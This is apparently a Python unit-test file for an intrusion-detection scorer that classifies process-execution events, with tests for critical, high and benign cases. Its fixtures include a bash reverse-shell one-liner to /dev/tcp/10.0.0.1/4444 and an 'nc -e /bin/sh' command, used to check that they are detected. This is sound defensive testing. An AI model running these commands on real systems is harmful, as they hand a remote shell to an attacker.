from node_scoring import score_event, RuleScorer


def _ev(**kw):
    base = {"event_type": "execve", "comm": "", "exe": "", "args": []}
    base.update(kw)
    return base


def test_reverse_shell_is_critical():
    v = score_event(
        _ev(
            comm="bash",
            exe="/usr/bin/bash",
            args=["bash", "-c", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"],
        )
    )
    assert v["is_threat"] is True
    assert v["severity"] == "critical"
    assert "/dev/tcp" in v["summary"]


def test_offensive_tool_flagged():
    v = score_event(_ev(comm="nc", exe="/usr/bin/nc", args=["nc", "-e", "/bin/sh"]))
    assert v["is_threat"] is True
    assert v["score"] >= 0.9


def test_exec_from_tmp_is_high():
    v = score_event(_ev(comm="x", exe="/tmp/x", args=["/tmp/x"]))
    assert v["is_threat"] is True
    assert v["severity"] == "high"


def test_benign_is_not_threat():
    v = score_event(_ev(comm="ls", exe="/usr/bin/ls", args=["ls", "-la"]))
    assert v["is_threat"] is False
    assert v["severity"] == "info"


def test_rulescorer_matches_function():
    ev = _ev(comm="nc", exe="/usr/bin/nc", args=["nc"])
    assert RuleScorer().score(ev) == score_event(ev)
